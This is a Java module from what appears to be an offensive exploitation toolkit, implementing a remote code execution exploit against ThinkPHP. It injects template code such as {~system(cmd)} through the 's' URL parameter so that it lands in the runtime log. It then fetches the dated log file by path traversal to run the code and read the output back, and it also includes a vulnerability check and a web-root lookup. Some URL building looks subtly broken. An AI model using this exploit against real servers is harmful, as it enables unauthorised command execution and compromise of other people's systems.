package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_index_showid_rce implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;
        url = url + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]";
        HttpTools.get(url, this.headers, "UTF-8");
        LocalDate date = LocalDate.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");
        url = url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C" + date.format(formatter) + ".log'";
        Response response = HttpTools.get(url, this.headers, "UTF-8");
        if (response.getText().contains("56540676a129760a3")) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String url = this.target + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system(\"" + cmd + "\")}]";
        HttpTools.get(url, this.headers, encoding);
        LocalDate date = LocalDate.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");
        url = url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C" + date.format(formatter) + ".log'";
        Response response = HttpTools.get(url, this.headers, encoding);
        if (response.getError() == null) {
            this.results = Tools.regReplace(response.getText());
        } else {
            this.results = response.getError();
        }

        return this.results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {

        return "---) 未实现 (---";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
